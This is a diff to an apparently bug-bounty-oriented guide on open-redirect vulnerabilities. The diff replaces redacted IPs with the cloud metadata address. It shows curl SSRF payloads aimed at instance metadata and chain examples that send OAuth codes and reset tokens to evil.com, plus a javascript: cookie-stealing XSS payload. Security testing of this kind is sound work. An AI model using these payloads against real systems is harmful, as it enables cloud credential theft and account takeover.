@@ -145,10 +145,10 @@ curl --max-time 30 --connect-timeout 10 -sv "$OAUTH_URL?response_type=code&clien
 ### Phase 5 — Server-Side Redirect (SSRF escalation)
 ```bash
 # If the app fetches the redirect target server-side (302 fetch follow)
-curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-[REDACTED_IP]/latest/meta-data/"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"
 
 # Or: if app makes HTTP request to the redirect destination
-curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/fetch?url=http://[REDACTED_IP]/latest/meta-data/" \
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
   -H "Cookie: $SESSION"
 ```
 
@@ -227,7 +227,7 @@ All 3 tests verify the skill is properly structured and ready for use.
 ## Related Skills
 
 - **`hunt-oauth`** — Open redirect on an OAuth `redirect_uri` turns a Low finding into Critical ATO. Chain primitive: `redirect_uri=https://target.com/redirect?url=https://evil.com` → auth code lands on evil.com → exchange for token → ATO.
-- **`hunt-ssrf`** — If the 302 redirect is followed *server-side* (image proxy, link preview), open redirect becomes SSRF. Chain primitive: server-side URL fetcher follows 302 from attacker host to `http://[REDACTED_IP]/latest/meta-data/` → cloud creds.
+- **`hunt-ssrf`** — If the 302 redirect is followed *server-side* (image proxy, link preview), open redirect becomes SSRF. Chain primitive: server-side URL fetcher follows 302 from attacker host to `http://169.254.169.254/latest/meta-data/` → cloud creds.
 - **`hunt-ato`** — Password reset links that include an open redirect in the return URL leak the token. Chain primitive: reset email contains `https://target.com/reset?token=X&redirect=https://evil.com` → token exfil via Referer or redirect.
 - **`hunt-xss`** — `javascript:` protocol in redirect parameters creates a single-click XSS. Chain primitive: `?redirect=javascript:alert(document.cookie)` → session cookie theft without server-side injection.
 - **`hunt-host-header`** — Open redirect via Host header injection overlaps with this class. Chain primitive: Host: evil.com → server builds redirect Location from Host → victim redirected to attacker host.
